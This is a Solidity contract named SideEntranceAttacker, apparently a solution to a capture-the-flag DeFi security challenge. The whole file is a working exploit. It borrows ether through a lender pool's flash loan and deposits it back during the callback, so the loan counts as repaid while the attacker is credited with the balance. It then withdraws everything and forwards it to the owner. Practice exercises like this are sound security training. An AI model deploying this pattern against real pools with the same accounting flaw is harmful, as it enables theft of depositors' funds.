// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract SideEntranceAttacker {
    SideEntranceLenderPool pool;
    address owner;

    constructor(SideEntranceLenderPool _pool, address _owner) {
        pool = _pool;
        owner = _owner;
    }

    function flashLoan(uint256 amount) external {
        pool.flashLoan(amount);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable  {}

    function transfer() external payable {
        pool.withdraw();
        payable(owner).transfer(address(this).balance);
    }
}
